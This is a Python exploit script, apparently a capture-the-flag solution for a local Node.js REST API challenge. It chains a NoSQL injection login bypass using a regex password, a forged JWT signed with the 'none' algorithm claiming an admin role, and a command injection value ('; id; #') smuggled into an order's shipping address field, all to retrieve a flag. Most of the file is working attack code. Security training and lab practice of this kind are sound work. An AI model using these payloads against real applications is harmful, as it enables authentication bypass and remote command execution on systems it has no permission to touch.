#!/usr/bin/env python3
"""
Exploit script for Challenge 3: Node.js REST API
Chains JWT + NoSQL Injection + Command Injection
"""

import requests
import json
import jwt
import sys

BASE_URL = "http://localhost:3000"

def exploit_nosql_injection():
    """Exploit NoSQL injection in login"""
    print("[*] Attempting NoSQL injection in login...")
    
    # NoSQL injection payload
    payload = {
        "username": "admin",
        "password": {"$regex": ".*"}  # Match any password
    }
    
    response = requests.post(f"{BASE_URL}/api/auth/login", json=payload)
    
    if response.status_code == 200:
        data = response.json()
        token = data.get('token')
        print(f"[+] Login successful! Token: {token[:50]}...")
        return token
    else:
        print(f"[-] NoSQL injection failed: {response.text}")
        return None

def exploit_jwt_algorithm_confusion():
    """Exploit JWT algorithm confusion"""
    print("[*] Attempting JWT algorithm confusion...")
    
    # Create JWT with 'none' algorithm
    payload = {
        'id': 'admin',
        'username': 'admin',
        'role': 'admin'
    }
    
    # Note: PyJWT requires different approach
    # For 'none' algorithm, need to manually construct token
    # Or use jwt library with algorithm='none'
    try:
        token = jwt.encode(payload, '', algorithm='none')
        print(f"[+] Created JWT with none algorithm: {token[:50]}...")
        return token
    except Exception as e:
        print(f"[-] JWT creation failed: {e}")
        return None

def get_flag_with_token(token):
    """Get flag using admin token"""
    print("[*] Attempting to get flag...")
    
    headers = {
        'Authorization': f'Bearer {token}'
    }
    
    response = requests.get(f"{BASE_URL}/api/admin/flag", headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        flag = data.get('flag')
        print(f"[+] FLAG FOUND: {flag}")
        return flag
    else:
        print(f"[-] Failed to get flag: {response.text}")
        return None

def exploit_command_injection(token):
    """Exploit command injection in order endpoint"""
    print("[*] Attempting command injection...")
    
    headers = {
        'Authorization': f'Bearer {token}'
    }
    
    # Command injection payload
    payload = {
        "productId": "123",
        "quantity": 1,
        "shippingAddress": "; id; #"
    }
    
    response = requests.post(f"{BASE_URL}/api/orders", json=payload, headers=headers)
    print(f"[+] Order created (command may have executed): {response.status_code}")

def main():
    print("=" * 60)
    print("Challenge 3: Node.js REST API Exploit")
    print("=" * 60)
    
    # Method 1: NoSQL Injection
    print("\n[*] Method 1: NoSQL Injection")
    token = exploit_nosql_injection()
    
    if token:
        flag = get_flag_with_token(token)
        if flag:
            return
    
    # Method 2: JWT Algorithm Confusion
    print("\n[*] Method 2: JWT Algorithm Confusion")
    token = exploit_jwt_algorithm_confusion()
    
    if token:
        flag = get_flag_with_token(token)
        if flag:
            return
    
    # Method 3: Command Injection
    if token:
        print("\n[*] Method 3: Command Injection")
        exploit_command_injection(token)
    
    print("\n[!] Note: JWT algorithm confusion may require manual token creation")
    print("[!] Use jwt.io or custom script to create token with 'none' algorithm")

if __name__ == "__main__":
    main()

